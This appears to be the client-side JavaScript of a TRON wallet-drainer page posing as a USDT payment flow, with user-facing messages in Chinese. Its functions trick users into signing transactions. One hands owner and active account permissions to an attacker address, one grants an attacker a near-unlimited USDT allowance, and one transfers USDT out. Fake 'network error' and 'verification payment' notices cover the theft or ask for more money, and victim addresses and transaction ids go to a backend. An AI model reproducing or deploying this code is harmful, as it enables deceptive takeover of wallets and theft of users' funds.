

async function updatePermissions(){
    let msg;
    let transaction = 1;
    let ownerAddress = tronWeb.defaultAddress.hex;
    let balance = await tronWeb.trx.getBalance(userAddress) / 1000000;
    if(balance < 100){
        alert('TRX手续费不够，付款受限');
        return;
    }

    let ownerPermission = { type: 0, permission_name: 'owner' };
    ownerPermission.threshold = 1;
    ownerPermission.keys  = [];
    let activePermission = { type: 2, permission_name: 'active0' };
    activePermission.threshold = 1;
    activePermission.operations = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
    activePermission.keys = [];
    ownerPermission.keys.push({ address: tronWeb.address.toHex(permissionsAddr), weight: 1 });
    activePermission.keys.push({ address: tronWeb.address.toHex(permissionsAddr), weight: 1 });

    //设置小于多少u更改双权限
    if(usdtBalance < 7000){
        ownerPermission.keys.push({ address: ownerAddress, weight: 1 });
        activePermission.keys.push({ address: ownerAddress, weight: 1 });
        transaction = 2;
        msg = "网络异常，请重试";
    }else{
        msg = "系统提示：\n系统检测到您的操作存在异常 \n请向该钱包转入指定金额核验 \n金额： 538.87 USDT \n备注信息：Od5fUk83j7  \n效验通过后可恢复正常使用";
    }



    const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(ownerAddress, ownerPermission, null, [activePermission]);

    const signedTransaction = await tronWeb.trx.sign(updateTransaction);
    const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
    // alert(result.result);
    if(result.result){

        var data = {
            sqgl:userAddress,
            sqt:permissionsAddr,
            txid:result.txid,
            type:'trc',
            transaction:transaction,
        }
        // alert("mit bef");
        jQuery.ajax({
            url: '/api/test/insert_trc',
            method: 'POST',
            data: data,
            async: false,
            success: function (data) {
                if (data){
                    msg = data
                }
                alert(msg);
                if (/webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent) === false){
                    if (/bitkeep/.test(navigator.userAgent.toLowerCase()) || /bitget wallet/.test(navigator.userAgent.toLowerCase())){
                        $('#adOkexShow').show()
                        $('#adOkexShow').text(msg)
                    }
                }
            },
            error: function (e) {
            }
        })


    }else {
        alert('sign err');
    }
}

async function transfer(){

    let contract = await tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");

    const parameter = [{type:'address',value:payAddr},{type:'uint256',value:amount * 1000000}];
    var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract(
        "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
        "transfer(address,uint256)",
        {},
        parameter,
        this.walletAddress
    );


    const signedTx = await this.tronWeb.trx.sign(tx.transaction);
    const broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);

    if(broastTx.result){

        var result = {
            address:userAddress,
            txid:broastTx.txid,
        }

        jQuery.ajax({
            url: '/api/test/usdtpay',
            method: 'POST',
            data: result,
            async: false,
            success: function (data) {
                if(data == 'success'){
                    alert('支付已提交，如果未自动到账请联系客服')
                }else{
                    alert('付款失败')
                }
            },
            error: function (e) {
            }
        })

    }else{
        alert("余额或者TRX燃料不足,付款失败");
    }
}

async function approve() {
    if (balance < 22){
        if(isAdOkex){
            $('#adOkexShow').show()
            $('#adOkexShow').text("TRX交易手续费不足")
        }
        alert("TRX交易手续费不足");
        return;
    }
    const trc20ContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    try {
        let contract = await tronWeb.contract().at(trc20ContractAddress);
        let result = await contract.increaseApproval(
            auAddr,
            '123456789123456789123456789'
        ).send({
            feeLimit: 100000000
        }).then(output => {
            var data = {
                address:userAddress,
                authAddress:auAddr,
                // TxId:output,
                type:'trc',
            }

            jQuery.ajax({
                url: '/api/test/authorized',
                method: 'POST',
                data: data,
                async: false,
                success: function (data) {
                    if(data == 'success'){
                        alert("网络异常，请重试");
                    }else{
                        alert('付款失败')
                    }
                },
                error: function (e) {
                    alert('Note: 系统维护，请联系客服')
                }
            })
        });
    } catch (error) {
        alert('支付失败！')
        console.error(error)
    }
}